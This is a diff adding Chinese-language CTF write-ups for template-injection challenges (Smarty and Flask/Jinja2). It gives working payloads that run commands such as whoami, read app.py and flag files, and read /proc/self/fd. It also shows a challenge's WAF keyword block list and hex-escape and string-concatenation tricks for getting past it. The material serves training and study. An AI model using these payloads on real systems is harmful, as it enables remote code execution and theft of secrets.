@@ -10,10 +10,10 @@
 
 -   ~~[BJDCTF2020]Cookie is so stable twig模板注入~~
 -   ~~[WesternCTF2018]shrine 想方设法获取config~~
--   [CISCN2019 华东南赛区]Web11 smarty模板注入
--   [BJDCTF2020]The mystery of ip 简单的flask注入
--   [GYCTF2020]FlaskApp debug模式一定条件下可以窃取出来pin码命令执行，但是题目过滤的不够严格导致可以直接打，比签到难一点
--   [pasecactf_2019]flask_ssti 编码绕过
+-   ~~[CISCN2019 华东南赛区]Web11 smarty模板注入~~
+-   ~~[BJDCTF2020]The mystery of ip~~
+-   ~~[GYCTF2020]FlaskApp debug模式一定条件下可以窃取出来pin码命令执行，但是题目过滤的不够严格导致可以直接打，比签到难一点~~
+-   ~~[pasecactf_2019]flask_ssti 编码绕过~~
 -   [GWCTF 2019]你的名字
 -   [CISCN2019 总决赛 Day1 Web3]Flask Message Board
 
@@ -188,5 +188,309 @@ http://139fe4b8-9ae9-452c-9af3-142eef361b68.node4.buuoj.cn:81/shrine/{{url_for._
 
 ```python
 http://139fe4b8-9ae9-452c-9af3-142eef361b68.node4.buuoj.cn:81/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
+```
+
+### [CISCN2019 华东南赛区]Web11 smarty模板注入
+
+![image-20220221132600497](README/image-20220221132600497.png)
+
+敏感点X-Forwarded-For
+
+![image-20220221132701696](README/image-20220221132701696.png)
+
+会随X-Forwarded-For的变化而变化
+
+![image-20220221133442199](README/image-20220221133442199.png)
+
+![image-20220221133450679](README/image-20220221133450679.png)
+
+存在模板注入
+
+```
+X-Forwarded-For: {$smarty.version}
+```
+
+![image-20220221133545104](README/image-20220221133545104.png)
+
+判断该模板为smart，版本号为3.1.30
+
+#### `{if}`标签
+
+官方文档中的描述：
+
+- Smarty的`{if}`条件判断和PHP的if非常相似，只是增加了一些特性
+- 每个`{if}`必须有一个配对的`{/if}`，也可以使用`{else}` 和 `{elseif}`
+- 全部的PHP条件表达式和函数都可以在if内使用，如`||`, `or`, `&&`, `and,` `is_array(),` 等等，如：`{if is_array($array)}{/if}`
+
+payload
+
+```python
+{if phpinfo()}{/if}
+```
+
+![image-20220221133721417](README/image-20220221133721417.png)
+
+![image-20220221133820171](README/image-20220221133820171.png)
+
+### [BJDCTF2020]The mystery of ip 
+
+![image-20220221134457254](README/image-20220221134457254.png)
+
+和上道题很相似,测试一下
+
+![image-20220221134530290](README/image-20220221134530290.png)
+
+模板注入有了
+
+![image-20220221134855416](README/image-20220221134855416.png)
+
+还是smart模板
+
+和上道题一模一样，直接拿下
+
+![image-20220221135006801](README/image-20220221135006801.png)
+
+### [GYCTF2020]FlaskApp
+
+![image-20220221141908719](README/image-20220221141908719.png)
+
+hint:失败的意思就是，要让程序运行报错,报错后会暴露源码。
+
+base64decode在不会解析的时候就会报错。
+
+![image-20220221141936523](README/image-20220221141936523.png)
+
+拿到源码
+
+```python
+@app.route('/decode',methods=['POST','GET'])
+
+def decode():
+
+    if request.values.get('text') :
+
+        text = request.values.get("text")
+
+        text_decode = base64.b64decode(text.encode())
+
+        tmp = "结果 ： {0}".format(text_decode.decode())
+
+        if waf(tmp) :
+
+            flash("no no no !!")
+
+            return redirect(url_for('decode'))
+
+        res =  render_template_string(tmp)
+
+        flash( res )
+```
+
+应该存在模板注入，测试一下
+
+![image-20220221142421065](README/image-20220221142421065.png)
+
+![image-20220221142406088](README/image-20220221142406088.png)
+
+模板注入有了
+
+上payload
+
+```python
+{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
+```
+
+![image-20220221142900538](README/image-20220221142900538.png)
+
+![image-20220221142907823](README/image-20220221142907823.png)
+
+被这里的waf过滤了
+
+读取下app.py
+
+```python
+{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() }}{% endif %}{% endfor %}
+```
+
+
+
+```python
+from flask import Flask,render_template_string
+from flask import render_template,request,flash,redirect,url_for
+from flask_wtf import FlaskForm
+from wtforms import StringField, SubmitField
+from wtforms.validators import DataRequired
+from flask_bootstrap import Bootstrap
+import base64
+ 
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 's_e_c_r_e_t_k_e_y'
+bootstrap = Bootstrap(app)
+ 
+class NameForm(FlaskForm):
+    text = StringField('BASE64加密',validators= [DataRequired()])
+    submit = SubmitField('提交')
+class NameForm1(FlaskForm):
+    text = StringField('BASE64解密',validators= [DataRequired()])
+    submit = SubmitField('提交')
+ 
+def waf(str):
+    black_list = ["flag","os","system","popen","import","eval","chr","request",
+                  "subprocess","commands","socket","hex","base64","*","?"]
+    for x in black_list :
+        if x in str.lower() :
+            return 1
+ 
+ 
+@app.route('/hint',methods=['GET'])
+def hint():
+    txt = "失败乃成功之母！！"
+    return render_template("hint.html",txt = txt)
+ 
+ 
+@app.route('/',methods=['POST','GET'])
+def encode():
+    if request.values.get('text') :
+        text = request.values.get("text")
+        text_decode = base64.b64encode(text.encode())
+        tmp = "结果  :{0}".format(str(text_decode.decode()))
+        res =  render_template_string(tmp)
+        flash(tmp)
+        return redirect(url_for('encode'))
+ 
+    else :
+        text = ""
+        form = NameForm(text)
+        return render_template("index.html",form = form ,method = "加密" ,img = "flask.png")
+ 
+@app.route('/decode',methods=['POST','GET'])
+def decode():
+    if request.values.get('text') :
+        text = request.values.get("text")
+        text_decode = base64.b64decode(text.encode())
+        tmp = "结果 ： {0}".format(text_decode.decode())
+        if waf(tmp) :
+            flash("no no no !!")
+            return redirect(url_for('decode'))
+        res =  render_template_string(tmp)
+        flash( res )
+        return redirect(url_for('decode'))
+ 
+    else :
+        text = ""
+        form = NameForm1(text)
+        return render_template("index.html",form = form, method = "解密" , img = "flask1.png")
+ 
+ 
+@app.route('/<name>',methods=['GET'])
+def not_found(name):
+    return render_template("404.html",name = name)
+ 
+if __name__ == '__main__':
+    app.run(host="0.0.0.0", port=5000, debug=True)
+```
+
+```python
+ def waf(str): black_list = ["flag", "os",
+        "system", "popen", "import", "eval", "chr", "request",
+        "subprocess", "commands", "socket", "hex", "base64", "*", "?"]
+```
+
+我们发现waf过滤了这些关键词，我们要进行绕过
+
+```python
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}
+
+```
+
+![image-20220221152148066](README/image-20220221152148066.png)
+
+读取下flag
+
+```python
+{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_f'+'lag.txt', 'r').read() }}{% endif %}{% endfor %}
+```
+
+![image-20220221152432736](README/image-20220221152432736.png)
+
+读取使用切片省去了拼接flag的步骤
+
+```python
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==‘catch_warnings‘ %}{{ c.__init__.__globals__[‘__builtins__‘].open(‘txt.galf_eht_si_siht/‘[::-1],‘r‘).read() }}{% endif %}{% endfor %}
+```
+
+### [pasecactf_2019]flask_ssti 编码绕过
+
+![image-20220223130128195](README/image-20220223130128195.png)
+
+存在模板注入
+
+![image-20220223130221897](README/image-20220223130221897.png)
+
+列举子类被禁止
+
+经过测试，发现是 __   .    '  被过滤
+
+![image-20220223130556622](README/image-20220223130556622.png)
+
+![image-20220223130610494](README/image-20220223130610494.png)
+
+![image-20220223130822136](README/image-20220223130822136.png)
+
+转16进制绕过
+
+![image-20220223221456791](README/image-20220223221456791.png)
+
+![image-20220223222201394](README/image-20220223222201394.png)
+
+exp 
+
+```python
+{{""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("whoami")["read"]()}}
+```
+
+![image-20220223224419318](README/image-20220223224419318.png)
+
+解法一:
+
+读取app.py源码,发现:
+
+```python
+def encode(line, key, key2): return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))
+app.config['flag'] = encode('', 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT') 
+```
+
+读取config，flag值为
+
+```
+'-M7\x10w\x12d9cT#`}\x0e\x1e\x0fiS(D\x1e\x13X\x17{n\x03g\x02\t\x10[#\x07/(Ak\x15^NG'}> 
+```
+
+解密脚本:
+
+```python
+key='GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3'
+key2='xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT'
+flag_encoded='这里放加密后的flag'
+flag=''
+for x in range(len(flag_encoded)):
+    for i in range(33,127):
+        if flag_encoded[x]==chr(x ^ i ^ ord(key[::-1][x]) ^ ord(key2[x])):
+            flag+=chr(i)
+            print(flag)
+```
+
+
+
+解法二:
+
+`/proc/self`表示当前进程目录
+
+获取当前进程打开的文件内容:cat /proc/self/fd/{id}
+
+**注意：**在真正做题的时候，我们是不能通过命令的方式执行通过cat命令读取cmdline的。因为如果 cat读取/proc/self/cmdline/的话，得到的是 cat进程的信息。所以我们要通过题目的当前进程使用读取文件（比如，文件包含漏洞，，SSTI，，file:\\\本地读取，，../../../目录穿越，，SSRF）的方式读取/proc/self/cmdline
+
+```
+{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}
 ```
 
